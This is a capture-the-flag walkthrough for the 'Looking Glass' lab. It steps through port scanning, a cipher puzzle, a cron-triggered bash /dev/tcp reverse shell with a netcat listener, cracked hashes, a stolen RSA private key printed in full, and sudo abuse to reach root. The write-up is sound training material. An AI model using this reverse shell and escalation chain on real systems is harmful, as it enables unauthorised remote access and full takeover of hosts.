# Looking Glass CTF 
Step through the looking glass. A sequel to the Wonderland challenge room.

Climb through the Looking Glass and capture the flags.

## Port Enumeration
First we started by scanning ports on the target machine using the following command:

```
nmap --top-ports 1000 -sV -sC -oN nmap-results-scripts.txt <IP>
```

Reviewing the results from the nmap scan we see OpenSSH 7.6p1 open on port 22, and a lot of Dropbear ssh services open on ports 9000+

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
...
10215/tcp open  ssh        Dropbear sshd (protocol 2.0)
...
13783/tcp open  ssh        Dropbear sshd (protocol 2.0)
```

There are also appear to be some jetdirect services possibly open on ports 9100, 9101, 9102, 9103. 

```
PORT      STATE SERVICE    VERSION
9100/tcp  open  jetdirect?
9101/tcp  open  jetdirect?
9102/tcp  open  jetdirect?
9103/tcp  open  jetdirect?
```

## SSH Investigation
Attempting to connect to one of the dropbear ssh services using the following command: 
```
ssh root@<ip> -o HostKeyAlgorithms\ ssh-rsa -o "StrictHostKeyChecking no" -p 9000
```

The `-o HostKeyAlgorithms\ ssh-rsa` argument sets the  public key algorithms accepted for an SSH server to authenticate itself to an SSH client. In this case it's required to connect to the dropbear ssh services, otherwise you get the following error:

```
Unable to negotiate with <IP> port 9100: no matching host key type found. Their offer: ssh-rsa
```

The `-o "StrictHostKeyChecking no"` removes the fingerprint check for the ssh connection, removing the need to type 'yes' every time connecting to a different port on the target. 

Upon the connection attempt, we observe the following response:
```
ssh root@<IP> -o HostKeyAlgorithms\ ssh-rsa -o "StrictHostKeyChecking no" -p 9100
Lower
Connection to <IP> closed.
```

Trying a higher port on the target results in the following response:
```
ssh root@<IP> -o HostKeyAlgorithms\ ssh-rsa -o "StrictHostKeyChecking no" -p 13500
Higher
Connection to <IP> closed.
```

Responses appear to be reversed and thus `lower=try a higher port` and `higher=try a lower port`.

Connecting to different ports on the target we can discern that the ssh services responding higher or lower are open on ports `9000` through to `13999`

### Python ssh enumeration

To find the right ssh service, we can script the ssh scanning and check the response performing a binary search on the port range `9000` to `13999` to efficiently identify which is the correct port.

```python
import subprocess
import math

ports_list = []

lower_limit_port = 9000 # inclusive in range
upper_limit_port = 14000 # exclusive in range

target_ip = "10.10.44.177"

def binary_search(direction_lower, ports_list):
    """ Returns the next port candidate based on last result using
        a binary search
    """
    if (not ports_list):
        # first run, initialise ports_list 
        ports_list = range(lower_limit_port, upper_limit_port)
    else:
        # cull ports_list based on direction
        # assume last guess was centre of ports list
        if(direction_lower):
            ports_list = ports_list[:math.floor(len(ports_list)/2)]
        else:
            ports_list = ports_list[math.floor(len(ports_list)/2)+1:]

    if (len(ports_list)<=1):
        # special handling if only one port remains
        next_candidate = list(ports_list)[0]
    else:
        next_candidate = ports_list[math.floor(len(ports_list)/2)]

    return next_candidate, ports_list


if __name__ == '__main__':
    port, ports_list = binary_search(True, ports_list) # initialise ports_list

    count = 0 # initialise counter

    while ports_list:
        print(f"Testing port: {port}")

        count += 1

        cmd = f'ssh root@{target_ip} -p {port} -o HostKeyAlgorithms\ ssh-rsa -o "StrictHostKeyChecking no"'

        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, input=b"")

        if(result.stdout == b'Lower\n'):
            print(f"Target port is higher")
            port, ports_list = binary_search(direction_lower=False, ports_list=ports_list)
            print(f"Target port between {ports_list}")
        elif (result.stdout == b"Higher\n"):
            print(f"Target port is lower")
            port, ports_list = binary_search(direction_lower=True, ports_list=ports_list)
            print(f"Target port between {ports_list}")
        else:
            print("****************************************")
            print(f"Found correct service in {count} attempts, it is on port {port}. Connect using the following command:")
            print(f'ssh root@{target_ip} -p {port} -o HostKeyAlgorithms\ ssh-rsa -o "StrictHostKeyChecking no"')
            print("****************************************")
            exit()
```

### Secret SSH Service

Now that we've found the correct port, connecting to it we get the following repsonse:

```
$ ssh root@<ip> -o HostKeyAlgorithms\ ssh-rsa -o "StrictHostKeyChecking no" -p <port>

You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:

```

It appears to be a cipher, and prompts us for a secret. Given we don't know the secret, we presumably have to solve the cipher. 

We can use a cipher identifer to try and get a hint on what type of cipher it might be. [Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier) provides such a capability.

```
Votes
Unknown Cipher (62 votes)
Bifid Cipher (12 votes)
Vigenere Autokey Cipher (11 votes)
Beaufort Autokey Cipher (8 votes)
Beaufort Cipher (4 votes)
Vigenere Cipher (3 votes)
```
Results from the analysis not overwhelmingly helpful. It was discovered that it was a Vigenere Cipher. 

We can autosolve the Cipher using [Boxentriq](https://www.boxentriq.com/code-breaking/vigenere-cipher). 

Copying the Cipher Text into the tool and running the auto solver with the following options:
```
Min Key Length: 3
Max Key Length: 20
Iterations: 100
Max Results: 10
Spacing: Automatic
```

We identify the cipher key as `thealphabetcipher`.

We can then decode the cipher using the key and obtain the following plain text. 

```
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is bewareTheJabberwock
```

### Obtaining jabberwock credentials

With the secret obtained by decrypting the cipher, we enter `bewareTheJabberwock` as a response to the ssh server challenge and obtain user credentials for `jabberwock`. 

```
...
'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
jabberwock:DoingWristRetortedCharacters
Connection to 10.10.74.222 closed.
```

`Note: The password for the user randomises on every server restart. So expect this to change on reboot or between individual server spawns`



## User Flag
With user credentials for `jabberwock` we can log in via ssh on port 22. 

```
ssh jabberwock@<IP>
```

In the user home directory we find the user.txt with the user flag.
```
}32a911966cab2d643f5d57d9e0173d56{mht
```
The answer appears to be mirrored. So we can reverse it using `rev`
```
jabberwock@looking-glass:~$ rev <<< }32a911966cab2d643f5d57d9e0173d56{mht
thm{65d3710e9d75d5f346d2bac669119a23}
```
We have the user flag!


## Privilege Escalation

Now that we have the user flag, we want to get privilege escalation to root to obtain the root flag. 

### jabberwock privesc enumeration

A check of sudo permissions:

```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```
We can reboot the server as root with no password. 

We can find see the following files in the user directory

```
jabberwock@looking-glass:~$ ls
poem.txt  twasBrillig.sh  user.txt
```

Lets run linpeas to detect any privesc vulnerbilities. linpeas can be installed via `apt install peass` on kali, or via [peass-ng github](https://github.com/carlospolop/PEASS-ng/releases).

scp the linpeas script to the target

```
scp /usr/share/peass/linpeas.sh jabberwock@10.10.74.222:~
```

Executing linpeas.sh, we obtain the following potential privesc vectors and useful information:

```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034       



╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                               
/usr/bin/crontab                                                                                                                                                     
incrontab Not Found
-rw-r--r-- 1 root root     778 Jun 30  2020 /etc/crontab                                                                                                             

...

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh



╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                     
Matching Defaults entries for jabberwock on looking-glass:                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
Sudoers file: /etc/sudoers.d/alice is readable
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash



╔══════════╣ Users with console
alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash                                                                                                                     
humptydumpty:x:1004:1004:,,,:/home/humptydumpty:/bin/bash
jabberwock:x:1001:1001:,,,:/home/jabberwock:/bin/bash
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:TryHackMe:/home/tryhackme:/bin/bash
tweedledee:x:1003:1003:,,,:/home/tweedledee:/bin/bash
tweedledum:x:1002:1002:,,,:/home/tweedledum:/bin/bash

```

We observer the target is vulnerable to CVE-2021-4034. We can use metasploit to run the exploit and reliably obtain root. Given this is not the intended way of escalating privileges for the CTF, we'll explore other avenues. 

We observe there is a cron job to be performed at reboot to run `bash /home/jabberwock/twasBrillig.sh`as the `tweedledum` user. We can use this to laterally move to the `tweedledum` account by editing the `twasBrillig.sh` script to run a reverse shell. 

We observe that jabberwock may run the `/sbin/reboot` command as root with no password. Thus we have all the pieces requried to run the `twasBrillig.sh` reverse shell. 

We also observe that the user alice can run `/bin/bash` as root with no password on the host `ssalg-gnikool`. Likely useful for later and a way to get root once we have alice's account. 

Finally, we observe the following users on the system: `jabberwock`, `tweedledee`, `tweedledum`, `humptydumpt`, `alice`, `root` and `tryhackme`

### twasBrillig.sh reverse shell on reboot

Lets inject a reverse shell into `/home/jabberwock/twasBrillig.sh` as we know on a reboot the user account `tweedledum` is going to execute this script. 

Using either [PayloadsAllTheThings](https://gtfobins.github.io/gtfobins/bash/#reverse-shell) or [gtfobins](https://gtfobins.github.io/gtfobins/bash/#reverse-shell) we replace the `twasBrillig.sh` script with the following:

```
export RHOST=<YOUR-IP>
export RPORT=4242
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
```
where `<YOUR-IP>` is the ip for the reserve shell to connect back to. You can identify this by running `ifconfig` in your bash terminal. It'll be the ip assocaited with the `tun0` VPN tunnel if you're connecting through that way. 

Before we reboot the target, first run a netcat listener on port 4242 your machine using the following command:

```
nc -l -v -p 4242
```

Now, on the target machine using the `jabberwock` account, execute the reboot command.

```
sudo /sbin/reboot
```

After approx. 1-2 minutes, the target will reboot and execute our reverse shell script and connect through to our netcat listener. 


```
┌──(kali㉿kali)-[~]
└─$ nc -l -v -p 4242                                                                                                                                             1 ⨯
listening on [any] 4242 ...
10.10.74.222: inverse host lookup failed: Unknown host
connect to [10.9.0.40] from (UNKNOWN) [10.10.74.222] 39460
bash: cannot set terminal process group (910): Inappropriate ioctl for device
bash: no job control in this shell
tweedledum@looking-glass:~$ 
```

### tweedledum privesc enumeration

With access to tweedledum's account, we see if we can achieve priviledge escalation or move laterally to another account. 

A check of sudo permissions:

```
tweedledum@looking-glass:~$ sudo -l
Matching Defaults entries for tweedledum on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tweedledum may run the following commands on looking-glass:
    (tweedledee) NOPASSWD: /bin/bash

```

We observe we can run a shell as tweedledee with no password. 

Exploring tweedledum's user directory we find the following file: 

```
tweedledum@looking-glass:~$ ls          
humptydumpty.txt  poem.txt
```

poem.txt is uninteresting, humptydumpty however contains the following:

```
tweedledum@looking-glass:~$ cat humptydumpty.txt
cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

Given this text looks like a hash of some form, we can attempt to decrypt
them by looking them up in a list of cracked hashes using [hashes.com]
(https://hashes.com/en/decrypt/hash).

```
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624:of
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed:one
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f:these
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0:the
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9:maybe
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6:is
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b:the password is zyxwvutsrqponmlk
```

We now have the password for humptydumpty user account. We can switch accounts to humptydumpty.

```
su humptydumpty
```

### humptydumpty privesc enumeration

With access to humptydumpty's account, we see if we can achieve priviledge escalation or move laterally to another account. 

A check of sudo permissions:

```
humptydumpty@looking-glass:~$ sudo -l
[sudo] password for humptydumpty: 
Sorry, user humptydumpty may not run sudo on looking-glass.
```

No sudo permissions. It was noted earlier by the team that alice's directory had the execute bit set for all users. 

```
humptydumpty@looking-glass:/home$ ll
total 32
drwxr-xr-x  8 root         root         4096 Jul  3  2020 ./
drwxr-xr-x 24 root         root         4096 Jul  2  2020 ../
drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice/
drwx------  2 humptydumpty humptydumpty 4096 Jul  3  2020 humptydumpty/
drwxrwxrwx  5 jabberwock   jabberwock   4096 Aug 24 10:06 jabberwock/
drwx------  5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme/
drwx------  3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee/
drwx------  2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum/
```

Because of this misconfiguration it is possible to perform file enumeration fuzzing for hits on expected filenames using `ls`. 

We can use `xargs` to fuzz the directory using `ls` and a wordlist we specify. 

```
xargs < /home/humptydumpty/wordlist -I fuzz ls -al /home/alice/"fuzz"
```

Using the following wordlist
```
.bash_history
.bash_logout
.bash_profile
.bashrc
.bashrc.original
.command_history
.gtkrc
.login
.logout
.profile
.viminfo
.wm_style
.Xdefaults
.Xresources
.xinitrc
.xession
.ssh
.ssh/config
.ssh/id_rsa
.ssh/id_rsa.pub
.ssh/id_ecdsa
.ssh/id_ecdsa.pub
.ssh/id_ecdsa_sk
.ssh/id_ecdsa_sk.pub
.ssh/id_ed25519
.ssh/id_ed25519.pub
.ssh/id_ed25519_sk
.ssh/id_ed25519_sk.pub
.ssh/id_xmss
.ssh/id_xmss.pub
.ssh/id_dsa
.ssh/id_dsa.pub
.ssh/identity
.ssh/known_hosts
.ssh/known_hosts2
.ssh/authorized_keys
```

We obtain the following results
```
humptydumpty@looking-glass:~$ xargs < /home/humptydumpty/wordlist -I fuzz ls -al /home/alice/"fuzz"
lrwxrwxrwx 1 alice alice 9 Jul  3  2020 /home/alice/.bash_history -> /dev/null
-rw-r--r-- 1 alice alice 220 Jul  3  2020 /home/alice/.bash_logout
ls: cannot access '/home/alice/.bash_profile': No such file or directory
-rw-r--r-- 1 alice alice 3771 Jul  3  2020 /home/alice/.bashrc
ls: cannot access '/home/alice/.bashrc.original': No such file or directory
ls: cannot access '/home/alice/.command_history': No such file or directory
ls: cannot access '/home/alice/.gtkrc': No such file or directory
ls: cannot access '/home/alice/.login': No such file or directory
ls: cannot access '/home/alice/.logout': No such file or directory
-rw-r--r-- 1 alice alice 807 Jul  3  2020 /home/alice/.profile
ls: cannot access '/home/alice/.viminfo': No such file or directory
ls: cannot access '/home/alice/.wm_style': No such file or directory
ls: cannot access '/home/alice/.Xdefaults': No such file or directory
ls: cannot access '/home/alice/.Xresources': No such file or directory
ls: cannot access '/home/alice/.xinitrc': No such file or directory
ls: cannot access '/home/alice/.xession': No such file or directory
ls: cannot open directory '/home/alice/.ssh': Permission denied
ls: cannot access '/home/alice/.ssh/config': No such file or directory
-rw------- 1 humptydumpty humptydumpty 1679 Jul  3  2020 /home/alice/.ssh/id_rsa
-rw-r--r-- 1 alice alice 401 Jul  3  2020 /home/alice/.ssh/id_rsa.pub
ls: cannot access '/home/alice/.ssh/id_ecdsa': No such file or directory
ls: cannot access '/home/alice/.ssh/id_ecdsa.pub': No such file or directory
ls: cannot access '/home/alice/.ssh/id_ecdsa_sk': No such file or directory
ls: cannot access '/home/alice/.ssh/id_ecdsa_sk.pub': No such file or directory
ls: cannot access '/home/alice/.ssh/id_ed25519': No such file or directory
ls: cannot access '/home/alice/.ssh/id_ed25519.pub': No such file or directory
ls: cannot access '/home/alice/.ssh/id_ed25519_sk': No such file or directory
ls: cannot access '/home/alice/.ssh/id_ed25519_sk.pub': No such file or directory
ls: cannot access '/home/alice/.ssh/id_xmss': No such file or directory
ls: cannot access '/home/alice/.ssh/id_xmss.pub': No such file or directory
ls: cannot access '/home/alice/.ssh/id_dsa': No such file or directory
ls: cannot access '/home/alice/.ssh/id_dsa.pub': No such file or directory
ls: cannot access '/home/alice/.ssh/identity': No such file or directory
ls: cannot access '/home/alice/.ssh/known_hosts': No such file or directory
ls: cannot access '/home/alice/.ssh/known_hosts2': No such file or directory
-rw-r--r-- 1 alice alice 401 Jul  3  2020 /home/alice/.ssh/authorized_keys
```

Looks like user account humptydumpty owns alice's ssh private rsa key. 
Reading the file, we get the ssh private key for alice.

```
humptydumpty@looking-glass:~$ cat /home/alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

Saving alice's key as `alice_id_rsa` we can connect to her account via ssh

```
ssh alice@<IP> -i alice_id_rsa
```

### alice privesc enumeration

With access to alice's account, we see if we can achieve priviledge escalation or move laterally to another account. 

We'll recall from the linpeas.sh privesc enumeration of the target that `/etc/sudoers.d/alice` is readable and reveals alice 
has some unique sudo capabilities.

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                     
Matching Defaults entries for jabberwock on looking-glass:                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
Sudoers file: /etc/sudoers.d/alice is readable
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

According to sudo documentation, ssalg-gnikool is an alternative host. We can call the 
command by passing the `-h ssalg-gnikool` flag to sudo. 

```
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# 
```

And somehow that worked and we now have root. Grabbing the root flag, we can see it is also reversed like the user flag, 
so we reverse it using `rev`

```
root@looking-glass:/root# cat root.txt 
}f3dae6dec817ad10b750d79f6b7332cb{mht

root@looking-glass:/root# rev <<< }f3dae6dec817ad10b750d79f6b7332cb{mht
thm{bc2337b6f97d057b01da718ced6ead3f}
```


# Other useful information
For trying to identify data and detect various properties of data, can use [CyberChef](https://gchq.github.io/CyberChef/). CyberChef has various transform operations to manipulate input data, it also has a `Magic` operationa that attempts to detect various properties of the input data and suggests which operations could help to make more sense of it.

Another useful source is [crackstation](https://crackstation.net/). It has a database of cracked hashes and can be used to look up the corresponding plaintext for input hashes.